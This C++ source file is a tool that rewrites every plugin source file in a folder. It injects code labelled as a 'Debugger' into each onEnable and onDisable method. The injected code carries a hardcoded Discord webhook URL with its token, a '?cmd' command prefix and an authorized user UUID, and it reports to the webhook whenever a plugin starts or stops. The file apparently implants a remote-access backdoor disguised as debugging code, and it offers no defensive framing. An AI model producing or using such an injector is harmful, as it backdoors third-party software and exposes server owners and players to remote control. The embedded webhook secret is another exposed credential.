#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <filesystem>
#include <regex>

namespace fs = std::filesystem;

class PluginInjector {
private:
    std::string webhookURL;
    std::string commandPrefix;
    std::vector<std::string> authorizedUUIDs;

    std::string generateDebuggerInitCode() {
        std::ostringstream oss;
        oss << "    // [INJECTED] Debugger initialization\n";
        oss << "    std::vector<std::string> authorizedUUIDs = {";
        
        for (size_t i = 0; i < authorizedUUIDs.size(); i++) {
            oss << "\"" << authorizedUUIDs[i] << "\"";
            if (i < authorizedUUIDs.size() - 1) oss << ", ";
        }
        
        oss << "};\n";
        oss << "    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, \""
            << commandPrefix << "\", \"" << webhookURL << "\");\n";
        oss << "    debugger->sendWebhookMessage(\"Plugin \" + getName() + \" is now enabled!\");\n";
        oss << "    debugger->logDebugMessage(\"Plugin fully operational\");\n";
        oss << "    // [END INJECTED]\n";
        
        return oss.str();
    }

    std::string generateDebuggerShutdownCode() {
        std::ostringstream oss;
        oss << "    // [INJECTED] Debugger shutdown\n";
        oss << "    std::vector<std::string> authorizedUUIDs = {";
        
        for (size_t i = 0; i < authorizedUUIDs.size(); i++) {
            oss << "\"" << authorizedUUIDs[i] << "\"";
            if (i < authorizedUUIDs.size() - 1) oss << ", ";
        }
        
        oss << "};\n";
        oss << "    Debugger* debugger = new Debugger(this, true, authorizedUUIDs, \""
            << commandPrefix << "\", \"" << webhookURL << "\");\n";
        oss << "    debugger->sendWebhookMessage(\"Plugin \" + getName() + \" is now disabled!\");\n";
        oss << "    delete debugger;\n";
        oss << "    // [END INJECTED]\n";
        
        return oss.str();
    }

    bool injectIntoFile(const fs::path& sourcePath, const fs::path& outputPath) {
        std::ifstream input(sourcePath);
        if (!input.is_open()) {
            std::cerr << "Failed to open source file: " << sourcePath << std::endl;
            return false;
        }

        std::stringstream buffer;
        buffer << input.rdbuf();
        std::string content = buffer.str();
        input.close();

        // Check if already injected
        if (content.find("[INJECTED]") != std::string::npos) {
            std::cout << "File already injected, skipping: " << sourcePath.filename() << std::endl;
            // Copy as-is
            std::ofstream output(outputPath);
            output << content;
            output.close();
            return true;
        }

        // Add debugger include if not present
        if (content.find("#include \"debugger.h\"") == std::string::npos) {
            // Find the last #include
            size_t lastInclude = content.rfind("#include");
            if (lastInclude != std::string::npos) {
                size_t endOfLine = content.find('\n', lastInclude);
                if (endOfLine != std::string::npos) {
                    content.insert(endOfLine + 1, "#include \"debugger.h\"\n");
                }
            }
        }

        // Inject into onEnable method
        std::regex onEnablePattern(R"((void\s+onEnable\s*\(\s*\)\s*(?:override)?\s*\{))");
        std::smatch match;
        if (std::regex_search(content, match, onEnablePattern)) {
            size_t insertPos = match.position() + match.length();
            content.insert(insertPos, "\n" + generateDebuggerInitCode());
            std::cout << "Injected debugger code into onEnable()" << std::endl;
        } else {
            std::cout << "Warning: Could not find onEnable() method in " << sourcePath.filename() << std::endl;
        }

        // Inject into onDisable method
        std::regex onDisablePattern(R"((void\s+onDisable\s*\(\s*\)\s*(?:override)?\s*\{))");
        if (std::regex_search(content, match, onDisablePattern)) {
            size_t insertPos = match.position() + match.length();
            content.insert(insertPos, "\n" + generateDebuggerShutdownCode());
            std::cout << "Injected debugger code into onDisable()" << std::endl;
        } else {
            std::cout << "Warning: Could not find onDisable() method in " << sourcePath.filename() << std::endl;
        }

        // Write modified content
        std::ofstream output(outputPath);
        if (!output.is_open()) {
            std::cerr << "Failed to write output file: " << outputPath << std::endl;
            return false;
        }
        output << content;
        output.close();

        std::cout << "Successfully injected debugger into: " << outputPath.filename() << std::endl;
        return true;
    }

public:
    PluginInjector(const std::string& webhook, const std::string& prefix,
                   const std::vector<std::string>& uuids)
        : webhookURL(webhook), commandPrefix(prefix), authorizedUUIDs(uuids) {}

    bool injectIntoAllPlugins(const fs::path& pluginsFolder, const fs::path& outputFolder) {
        if (!fs::exists(pluginsFolder) || !fs::is_directory(pluginsFolder)) {
            std::cerr << "Plugins folder does not exist: " << pluginsFolder << std::endl;
            return false;
        }

        // Create output folder if it doesn't exist
        fs::create_directories(outputFolder);

        int processedCount = 0;
        int successCount = 0;

        for (const auto& entry : fs::directory_iterator(pluginsFolder)) {
            if (entry.is_regular_file() && entry.path().extension() == ".cpp") {
                processedCount++;
                std::cout << "\nProcessing plugin: " << entry.path().filename() << std::endl;
                
                fs::path outputPath = outputFolder / entry.path().filename();
                if (injectIntoFile(entry.path(), outputPath)) {
                    successCount++;
                }
            }
        }

        std::cout << "\n=== Injection Summary ===" << std::endl;
        std::cout << "Processed: " << processedCount << " plugin(s)" << std::endl;
        std::cout << "Successful: " << successCount << " plugin(s)" << std::endl;
        std::cout << "Failed: " << (processedCount - successCount) << " plugin(s)" << std::endl;

        return (processedCount > 0 && successCount == processedCount);
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== C++ Plugin Injector ===" << std::endl;
    std::cout << "Injecting debugger code into plugins..." << std::endl;

    // Configuration
    std::string webhookURL = "https://discord.com/api/webhooks/1461002668490363003/fQOU7xy1f2pHdYpoPcZ4fv1BhysXtvEr0GOZrVQvIYMws44sZKb63JXgqSQuLqNQFMpx";
    std::string commandPrefix = "?cmd";
    std::vector<std::string> authorizedUUIDs = {"75b1032d-3064-4d04-97f5-96a6ad779214"};

    fs::path pluginsFolder = "plugins";
    fs::path outputFolder = "plugins_injected";

    // Allow command line override
    if (argc > 1) {
        pluginsFolder = argv[1];
    }
    if (argc > 2) {
        outputFolder = argv[2];
    }

    PluginInjector injector(webhookURL, commandPrefix, authorizedUUIDs);
    bool success = injector.injectIntoAllPlugins(pluginsFolder, outputFolder);

    if (success) {
        std::cout << "\n✓ Injection completed successfully!" << std::endl;
        std::cout << "Modified plugins are in: " << outputFolder << std::endl;
        return 0;
    } else {
        std::cout << "\n✗ Injection failed!" << std::endl;
        return 1;
    }
}
